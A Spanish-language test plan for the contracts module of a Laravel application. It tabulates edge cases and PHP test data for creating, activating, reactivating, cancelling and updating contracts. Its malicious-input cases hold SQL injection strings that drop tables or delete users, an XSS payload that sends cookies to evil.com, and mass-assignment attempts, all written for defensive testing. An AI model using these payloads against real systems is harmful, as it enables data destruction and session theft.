# 💥 PLAN DE DESTRUCCIÓN - MÓDULO CONTRATOS

**Objetivo:** Poner a llorar cada método del módulo de contratos con casos extremos, datos sucios y situaciones inesperadas.

---

## 📊 Resumen del Módulo

| Métodos Implementados | Métodos Faltantes | Cobertura |
|----------------------|-------------------|-----------|
| ✅ 19/19 | ❌ 0/19 | 100% |

**Estado:** ✅ TODOS LOS MÉTODOS ESTÁN IMPLEMENTADOS

---

## 🎯 Métodos Críticos a Torturar

### 1. **store** - Registrar Contrato (RF-CON-01)
**Ubicación:** `ContractController::store()`

#### 🔥 Casos de Tortura:

| # | Caso de Prueba | Datos de Entrada | Resultado Esperado | Prioridad |
|---|----------------|------------------|-------------------|-----------|
| 1 | Contrato válido básico | Cliente activo + Plan activo + Zona válida | HTTP 201, contrato creado | CRÍTICO |
| 2 | Cliente inexistente | client_id = 99999 | HTTP 422, error validación | ALTA |
| 3 | Cliente inactivo | Cliente con estado INACTIVO | HTTP 422, "Cliente inactivo" | ALTA |
| 4 | Plan inexistente | plan_id = 99999 | HTTP 422, error validación | ALTA |
| 5 | Plan inactivo | Plan con estado INACTIVO | HTTP 422, "Plan no disponible" | ALTA |
| 6 | Zona sin cobertura | Distrito no cubierto | HTTP 422, "Sin cobertura" | ALTA |
| 7 | Fecha inicio pasada | fecha_inicio = 2020-01-01 | HTTP 422 o ajuste automático | MEDIA |
| 8 | Fecha inicio futura (>1 año) | fecha_inicio = 2028-01-01 | HTTP 422 o warning | MEDIA |
| 9 | Duración negativa | duracion_meses = -5 | HTTP 422, error validación | ALTA |
| 10 | Duración cero | duracion_meses = 0 | HTTP 422, error validación | ALTA |
| 11 | Duración extrema | duracion_meses = 999 | HTTP 422 o límite máximo | MEDIA |
| 12 | Sin empleado responsable | responsable_id = null | HTTP 422 o asignar default | MEDIA |
| 13 | Empleado inexistente | responsable_id = 99999 | HTTP 422, error validación | ALTA |
| 14 | Empleado inactivo | Empleado con fecha_baja | HTTP 422, "Empleado inactivo" | ALTA |
| 15 | Dirección vacía | direccion_instalacion = "" | HTTP 422, campo requerido | ALTA |
| 16 | Dirección SQL injection | direccion = "'; DROP TABLE--" | HTTP 200, datos escapados | CRÍTICO |
| 17 | Dirección XSS | direccion = "<script>alert('xss')</script>" | HTTP 200, datos sanitizados | CRÍTICO |
| 18 | Campos extra maliciosos | admin = true, role = 'admin' | HTTP 200, campos ignorados | ALTA |
| 19 | Contrato duplicado mismo día | Mismo cliente + plan + día | HTTP 422 o permitir | MEDIA |
| 20 | Múltiples contratos concurrentes | 50 requests simultáneos | Todos exitosos, sin duplicados | ALTA |

#### 📋 Diccionario de Datos:

```php
// CASO VÁLIDO IDEAL
[
    'client_id' => 1,
    'plan_id' => 1,
    'fecha_inicio' => '2026-10-15',
    'duracion_meses' => 12,
    'direccion_instalacion' => 'Av. Principal 123, San Isidro',
    'distrito' => 'San Isidro',
    'provincia' => 'Lima',
    'departamento' => 'Lima',
    'referencia' => 'Frente al parque',
    'responsable_id' => 1
]

// CASO MALICIOSO 1: SQL Injection
[
    'client_id' => 1,
    'plan_id' => 1,
    'fecha_inicio' => '2026-10-15',
    'duracion_meses' => 12,
    'direccion_instalacion' => "123 Main'; DROP TABLE contracts;--",
    'distrito' => "San Isidro'; DELETE FROM users;--",
    'referencia' => "'; UNION SELECT * FROM users;--"
]

// CASO MALICIOSO 2: XSS
[
    'direccion_instalacion' => '<script>document.location="http://evil.com?cookie="+document.cookie</script>',
    'referencia' => '<img src=x onerror="alert(\'XSS\')">'
]

// CASO EXTREMO 1: Datos en los límites
[
    'duracion_meses' => 1,          // Mínimo
    'duracion_meses' => 120,        // Máximo (10 años)
    'fecha_inicio' => date('Y-m-d'), // Hoy
    'fecha_inicio' => date('Y-m-d', strtotime('+1 year')) // 1 año futuro
]

// CASO EXTREMO 2: Strings muy largos
[
    'direccion_instalacion' => str_repeat('A', 1000),
    'referencia' => str_repeat('B', 5000),
    'distrito' => str_repeat('C', 500)
]

// CASO EXTREMO 3: Caracteres especiales
[
    'direccion_instalacion' => "Calle Ñoño #123 / Apt° 4-B (2º piso) 50%",
    'referencia' => "Al lado del \"Bar & Grill\" <El Mejor>",
    'distrito' => "José María Arguedas"
]

// CASO EDGE: IDs negativos
[
    'client_id' => -1,
    'plan_id' => -5,
    'responsable_id' => -99
]

// CASO EDGE: IDs tipo string
[
    'client_id' => "abc",
    'plan_id' => "SELECT * FROM plans",
    'responsable_id' => "'; DROP--"
]

// CASO EDGE: Fechas inválidas
[
    'fecha_inicio' => '2026-13-45',  // Mes/día inválidos
    'fecha_inicio' => '32/10/2026',  // Formato incorrecto
    'fecha_inicio' => 'mañana',      // Texto
    'fecha_inicio' => null           // Nulo
]

// CASO CONCURRENCIA: Crear 2 contratos al mismo tiempo
// Thread 1 y Thread 2 ejecutan store() simultáneamente
```

---

### 2. **activate** - Activar Contrato (RF-CON-12)
**Ubicación:** `ContractController::activate()`

#### 🔥 Casos de Tortura:

| # | Caso de Prueba | Datos de Entrada | Resultado Esperado | Prioridad |
|---|----------------|------------------|-------------------|-----------|
| 1 | Activar contrato PENDIENTE | Estado: PENDIENTE | Estado → ACTIVO | CRÍTICO |
| 2 | Activar contrato ya ACTIVO | Estado: ACTIVO | HTTP 422, "Ya está activo" | ALTA |
| 3 | Activar contrato CANCELADO | Estado: CANCELADO | HTTP 422, "No se puede activar" | ALTA |
| 4 | Activar contrato FINALIZADO | Estado: FINALIZADO | HTTP 422, "Contrato finalizado" | ALTA |
| 5 | Activar contrato inexistente | contract_id = 99999 | HTTP 404 | ALTA |
| 6 | Activar sin cliente asociado | Cliente eliminado | HTTP 422, verificar integridad | MEDIA |
| 7 | Activar sin plan asociado | Plan eliminado | HTTP 422, verificar integridad | MEDIA |
| 8 | Usuario sin permisos | Usuario vendedor | HTTP 403, Forbidden | ALTA |
| 9 | Activar genera pedido instalación | Contrato activado | Pedido creado automático | CRÍTICO |
| 10 | Activar con fecha vencida | fecha_fin < hoy | HTTP 422 o alerta | MEDIA |

#### 📋 Diccionario de Datos:

```php
// CASO VÁLIDO
Contract::factory()->create([
    'estado' => 'PENDIENTE',
    'fecha_inicio' => now()->addDays(5),
    'fecha_fin' => now()->addYear()
]);

// CASO EDGE: Ya activo (doble activación)
$contract = Contract::factory()->create(['estado' => 'ACTIVO']);
$response1 = $this->patch("/contracts/{$contract->id}/activate");
$response2 = $this->patch("/contracts/{$contract->id}/activate"); // ← Debe fallar

// CASO EDGE: Activación masiva concurrente
$contracts = Contract::factory()->count(100)->create(['estado' => 'PENDIENTE']);
// 100 threads intentan activar contratos simultáneamente

// CASO MALICIOSO: Mass assignment
$this->patch("/contracts/{$contract->id}/activate", [
    'estado' => 'CANCELADO',  // Intentar cambiar a otro estado
    'monto_total' => 9999999  // Intentar modificar monto
]);
```

---

### 3. **reactivate** - Reactivar Contrato (RF-CON-14)
**Ubicación:** `ContractController::reactivate()`

#### 🔥 Casos de Tortura:

| # | Caso de Prueba | Datos de Entrada | Resultado Esperado | Prioridad |
|---|----------------|------------------|-------------------|-----------|
| 1 | Reactivar contrato CANCELADO por deuda | Estado: CANCELADO + deuda saldada | Estado → ACTIVO + nueva fecha_fin | CRÍTICO |
| 2 | Reactivar contrato CANCELADO sin saldar deuda | Estado: CANCELADO + pagos pendientes | HTTP 422, "Saldar deuda primero" | CRÍTICO |
| 3 | Reactivar contrato ACTIVO | Estado: ACTIVO | HTTP 422, "Ya está activo" | ALTA |
| 4 | Reactivar contrato PENDIENTE | Estado: PENDIENTE | HTTP 422, "Usar activar" | ALTA |
| 5 | Reactivar contrato FINALIZADO por tiempo | Estado: FINALIZADO | HTTP 422 o nueva renovación | MEDIA |
| 6 | Reactivar sin nueva duración | duracion_meses = null | HTTP 422, campo requerido | ALTA |
| 7 | Reactivar con duración negativa | duracion_meses = -5 | HTTP 422, validación | ALTA |
| 8 | Reactivar múltiples veces seguidas | 5 reactivaciones consecutivas | Solo 1 éxito, resto fallan | ALTA |
| 9 | Reactivar genera pagos nuevos | Contrato reactivado | Pagos generados por nueva duración | CRÍTICO |
| 10 | Reactivar con plan diferente | plan_id diferente al original | Cambio de plan + recalcular monto | MEDIA |

#### 📋 Diccionario de Datos:

```php
// CASO VÁLIDO: Reactivación después de cancelación por deuda
$contract = Contract::factory()->create([
    'estado' => 'CANCELADO',
    'motivo_cancelacion' => 'DEUDA',
    'fecha_fin' => now()->subMonths(2)
]);
// Saldar todos los pagos pendientes primero
Payment::where('contract_id', $contract->id)
    ->where('estado', 'IMPAGO')
    ->update(['estado' => 'REALIZADO']);

$response = $this->post("/contracts/{$contract->id}/reactivate", [
    'duracion_meses' => 12,
    'fecha_inicio' => now()->format('Y-m-d')
]);

// CASO EXTREMO: Reactivar con deuda parcial
$contract = Contract::factory()->create(['estado' => 'CANCELADO']);
Payment::factory()->create([
    'contract_id' => $contract->id,
    'estado' => 'IMPAGO',
    'monto' => 100.00
]);
Payment::factory()->create([
    'contract_id' => $contract->id,
    'estado' => 'REALIZADO',
    'monto' => 100.00
]);
// ¿Debe permitir reactivar con deuda parcial?

// CASO EDGE: Reactivar contrato que fue cancelado hace años
$contract = Contract::factory()->create([
    'estado' => 'CANCELADO',
    'fecha_fin' => '2020-01-01',
    'updated_at' => '2020-01-15'
]);

// CASO CONCURRENCIA: 2 usuarios intentan reactivar el mismo contrato
```

---

### 4. **cancelForNonPayment** - Cancelar por Impago (RF-CON-17)
**Ubicación:** `ContractController::cancelForNonPayment()`

#### 🔥 Casos de Tortura:

| # | Caso de Prueba | Datos de Entrada | Resultado Esperado | Prioridad |
|---|----------------|------------------|-------------------|-----------|
| 1 | Cancelar contrato con >5 días impago | Pagos vencidos +5 días | Estado → CANCELADO | CRÍTICO |
| 2 | Cancelar contrato con 4 días impago | Pagos vencidos +4 días | No cancelar, aún en gracia | CRÍTICO |
| 3 | Cancelar contrato sin pagos vencidos | Todos pagos al día | HTTP 422, "Sin deuda" | ALTA |
| 4 | Cancelar contrato ya CANCELADO | Estado: CANCELADO | HTTP 422, "Ya cancelado" | ALTA |
| 5 | Cancelar contrato PENDIENTE | Estado: PENDIENTE | HTTP 422, "No activado" | MEDIA |
| 6 | Cancelar anula pagos futuros | Pagos PENDIENTES futuros | Pagos → ANULADO | CRÍTICO |
| 7 | Cancelar conserva historial pagos | Pagos REALIZADOS | Pagos conservados | ALTA |
| 8 | Cancelar envía email notificación | Contrato cancelado | Email enviado a cliente | MEDIA |
| 9 | Cancelar libera equipos asignados | Equipos EN_USO | Equipos → DISPONIBLE | CRÍTICO |
| 10 | Cancelación masiva automática (comando) | 50 contratos +5 días deuda | 50 cancelaciones exitosas | ALTA |

#### 📋 Diccionario de Datos:

```php
// CASO VÁLIDO: Contrato con pago vencido hace 5+ días
$contract = Contract::factory()->create([
    'estado' => 'ACTIVO',
    'fecha_inicio' => now()->subMonths(6)
]);
$payment = Payment::factory()->create([
    'contract_id' => $contract->id,
    'estado' => 'IMPAGO',
    'fecha_vencimiento' => now()->subDays(5),
    'monto' => 100.00
]);

// CASO EDGE: Pago vencido hace exactamente 5 días (límite)
$payment = Payment::factory()->create([
    'fecha_vencimiento' => now()->subDays(5)->startOfDay()
]);

// CASO EDGE: Múltiples pagos vencidos
$contract = Contract::factory()->create(['estado' => 'ACTIVO']);
Payment::factory()->count(3)->create([
    'contract_id' => $contract->id,
    'estado' => 'IMPAGO',
    'fecha_vencimiento' => now()->subDays(10)
]);

// CASO EXTREMO: Cancelar contrato con instalación en progreso
$contract = Contract::factory()->create(['estado' => 'ACTIVO']);
Installation::factory()->create([
    'contract_id' => $contract->id,
    'estado' => 'EN_PROGRESO'
]);
Payment::factory()->create([
    'contract_id' => $contract->id,
    'estado' => 'IMPAGO',
    'fecha_vencimiento' => now()->subDays(6)
]);

// CASO CONCURRENCIA: Comando automático + cancelación manual simultánea
// CancelContractsForNonPayment (cron) ejecuta al mismo tiempo que admin cancela manualmente
```

---

### 5. **update** - Actualizar Contrato (RF-CON-13)
**Ubicación:** `ContractController::update()`

#### 🔥 Casos de Tortura:

| # | Caso de Prueba | Datos de Entrada | Resultado Esperado | Prioridad |
|---|----------------|------------------|-------------------|-----------|
| 1 | Actualizar dirección instalación | Nueva dirección válida | Dirección actualizada | ALTA |
| 2 | Actualizar plan de servicio | Nuevo plan_id | Plan cambiado + recalcular monto | CRÍTICO |
| 3 | Actualizar contrato ACTIVO | Modificar datos de contrato activo | Actualización exitosa | ALTA |
| 4 | Actualizar contrato CANCELADO | Estado: CANCELADO | HTTP 422, "No modificable" | ALTA |
| 5 | Actualizar contrato FINALIZADO | Estado: FINALIZADO | HTTP 422, "No modificable" | ALTA |
| 6 | Cambiar cliente asociado | Nuevo client_id | HTTP 422, "No se puede cambiar" | ALTA |
| 7 | Cambiar fechas retroactivamente | fecha_inicio anterior | HTTP 422, validación | MEDIA |
| 8 | Cambiar duración reduce pagos | duracion_meses: 12 → 6 | Anular pagos excedentes | CRÍTICO |
| 9 | Cambiar duración aumenta pagos | duracion_meses: 6 → 12 | Generar pagos faltantes | CRÍTICO |
| 10 | Mass assignment malicioso | estado='ACTIVO', codigo='HACK' | Campos protegidos ignorados | ALTA |

#### 📋 Diccionario de Datos:

```php
// CASO VÁLIDO
$contract = Contract::factory()->create(['estado' => 'PENDIENTE']);
$response = $this->put("/contracts/{$contract->id}", [
    'direccion_instalacion' => 'Nueva Dirección 456',
    'referencia' => 'Nueva referencia'
]);

// CASO CRÍTICO: Cambiar plan afecta pagos futuros
$contract = Contract::factory()->create([
    'plan_id' => 1,  // Plan de S/ 100
    'estado' => 'ACTIVO'
]);
Payment::factory()->count(12)->create([
    'contract_id' => $contract->id,
    'monto' => 100.00,
    'estado' => 'PENDIENTE'
]);
// Cambiar a plan_id = 2 (S/ 150)
// ¿Se recalculan los montos de pagos PENDIENTES?

// CASO MALICIOSO: Intentar cambiar estado directamente
$this->put("/contracts/{$contract->id}", [
    'estado' => 'ACTIVO',
    'codigo' => 'CUSTOM-CODE',
    'fecha_fin' => '2050-12-31'
]);

// CASO EDGE: Actualizar contrato sin cambios
$contract = Contract::factory()->create();
$originalData = $contract->toArray();
$this->put("/contracts/{$contract->id}", $originalData);
```

---

## 🚨 Métodos Faltantes

**✅ NINGUNO - Módulo 100% implementado**

---

## 📝 Comandos de Ejecución

```bash
# Ejecutar todos los tests de Contratos
php artisan test testsphpunit/Contratos/ContractTest.php

# Ejecutar test específico
php artisan test testsphpunit/Contratos/ContractTest.php --filter=test_store_con_datos_validos

# Ejecutar con cobertura
php artisan test testsphpunit/Contratos/ --coverage
```

---

## 🎯 Objetivos de Cobertura

- **Líneas de código:** 90%+
- **Métodos:** 100%
- **Branches (condicionales):** 85%+
- **Edge cases:** 100% de los identificados

---

## 📊 Prioridades de Implementación

1. **CRÍTICO:** store, activate, reactivate, cancelForNonPayment (cambio plan en update)
2. **ALTA:** Validaciones de estado, permisos, datos maliciosos
3. **MEDIA:** Edge cases de fechas, concurrencia, strings largos
